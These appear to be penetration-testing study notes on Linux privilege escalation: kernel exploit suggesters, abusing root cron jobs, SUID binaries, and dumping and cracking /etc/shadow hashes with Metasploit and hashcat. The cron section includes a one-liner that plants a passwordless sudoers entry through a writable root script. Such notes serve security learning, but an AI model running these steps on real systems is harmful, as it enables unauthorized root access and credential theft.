*Kernel exploits on Linux will typically target vulnerabilities In the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell*


#### (TOOL) Linux-Exploit-Suggester 

*This tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It assesses (using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit.*
+ GitHub: https://github.com/mzet-/linux-exploit-suggester

---
# Cron Jobs

*Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.*

- An application, or script that has been configured to be run repeatedly with Cron is known as a **Cron job**. 
- **The crontab file** is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created.

#### Exploiting Cron jobs
- **Targeting Cron jobs that have been configured to be run as the “root” user**

1. Check out crontab file `crontab -l`
2. Check out weird files and paths related to them `find / -name FILE 2>/dev/null` or `grep -rnw DIRECTORY -e "PATH_TO_WEIRD_FILE"`
3.  check out permissions for the scripts related to the files
4. if there are full permissions, rewrite (No text editor ? No problem `printf '#! /bin/bash\necho "USER ALL=NOPASSWD:ALL" >> /etc/sudoers' > PATH_TO_FULL_PERM_SCRIPT`)
5. escalate `su`
6. BINGO

---
# SUID Binaries

*In addition to the three main file access permissions (read, write and execute), Linux also provides users with specialized permissions that can be utilized in specific situations. One of these access permissions is the **SUID (Set Owner User ID)** permission*

- This permission **provides users with the ability to execute a script or binary with the permissions of the file owner** as opposed to the user that is running the script
- if improperly configured unprivileged users can exploit misconfigurations or vulnerabilities within the binary or script to obtain an elevated session.

#### Exploiting SUID Binaries

*The success of our attack will depend on the following factors*:
- Owner of the SUID binary – Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the “root” user or other privileged users.
- Access permissions – We will require executable permissions in order to execute the SUID binary.

1. Identify file with SUID Bit set `sudo find / -perm -4000 -type f 2>/dev/null`
2. See if SUID file calls modifiable file 
3. Modify file to spawn a elevated shell 
4. (Check out GTFOBins [[https://gtfobins.github.io/|GTFOBins]])

---

# Dumping Linux Hashes

All of the **information for all accounts** on Linux is stored in the passwd file located in: **/etc/passwd**
- We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system.

All the **encrypted passwords for the users** are stored in the shadow file. it can be found in the following directory: **/etc/shadow**
- The shadow file can only be accessed and read by the root account
![[linux_password_hashes.png]]

#### Exploiting with Metasploit

1. Once you have access to the target use `use post/linux/gather/hashdump` and grab user hashes
2. Use hashcat corresponding mode [[https://hashcat.net/wiki/doku.php?id=example_hashes|Exemple hashes]] or use `use auxiliary/analyze/crack_linux`